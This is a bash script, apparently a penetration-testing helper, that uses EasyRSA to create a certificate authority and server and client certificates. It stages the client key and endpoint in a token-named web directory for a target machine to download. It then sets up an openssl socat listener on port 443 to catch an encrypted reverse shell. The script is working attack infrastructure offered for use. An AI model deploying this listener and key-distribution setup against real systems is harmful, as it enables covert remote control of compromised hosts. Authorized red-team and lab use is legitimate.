#!/usr/bin/env bash
if ! [ -x "$(command -v easyrsa)" ]; then
  echo "[*] Install EasyRSA"
  wget https://github.com/OpenVPN/easy-rsa/releases/download/v3.0.6/EasyRSA-unix-v3.0.6.tgz -O ${HOME}/EasyRSA.tgz
  tar xzvf ${HOME}/EasyRSA.tgz
  mv EasyRSA-v3.0.6 bin
  rm ${HOME}/EasyRSA.tgz
fi

echo "[*] Running easyrsa init-pki"
easyrsa init-pki

echo "[*] Running easyrsa build-ca"
echo "[*] This will set up our Certificate Authority"
easyrsa build-ca

echo "[*] Generating Certificate and Private key for the server"
read -p "Name of server: " servername
echo "[*] Running easyrsa gen-req " $servername " nopass"
easyrsa gen-req $servername nopass

echo "[*] Now we need to sign the new server certificate with your CA's private key"
echo "[*] We will run: easyrsa sign-req server $servername"

easyrsa sign-req server $servername

echo "[*] Now we need to generate a client certificate"
read -p "Name of client: " clientname

echo "[*] We will run: easyrsa gen-req $clientname nopass"
easyrsa gen-req $clientname nopass

echo "[*] Now we need to sign the new client certificate with your CA's private key"
echo "[*] We will run: easyrsa sign-req client $clientname"
easyrsa sign-req client $clientname


echo "[*] We are all done. Your CA certificate is called ca.crt"
randomtoken=`head /dev/urandom | tr -dc A-Za-z0-9 | head -c 20 ; echo ''`
echo "[*] This is your random token: " $randomtoken
mkdir -p ${HOME}/webbconfigprovider/$randomtoken
echo -n "$servername:443" > ${HOME}/webbconfigprovider/$randomtoken/endpoint
cp ./pki/ca.crt ${HOME}/webbconfigprovider/$randomtoken/ca
cat ./pki/issued/$clientname.crt ./pki/private/$clientname.key > ${HOME}/webbconfigprovider/$randomtoken/cert
echo "lol" > ${HOME}/webbconfigprovider/index.html
echo "[*] Use Certbot to get your TLS certificate."
echo "[*] You are ready to roll. Just run python https-server (https://github.com/xapax/python-https-server) to serv up this directory: ${HOME}/webbconfigprovider   but don't run the python server from that dir."
echo "[*] When your kubernetes-testingvm has downloaded the files your are done with the webserver, and can close it down."

echo "[*] Now let's set up our listener for our reverse shell"
mkdir ${HOME}/revlistener
cat ${HOME}/pki/issued/$servername.crt ${HOME}/pki/private/$servername.key > ${HOME}/revlistener/server.pem
cp ${HOME}/pki/ca.crt ${HOME}/revlistener/ca.crt

echo "[*] Now you are ready to receive your reverse shell. Go to ${HOME}/revlistener and run the following command:"
echo "[*] sudo socat file:\`tty\`,raw,echo=0 openssl-listen:443,reuseaddr,cert=server.pem,cafile=ca.crt"

echo "[*] Now you can await your incoming shell"
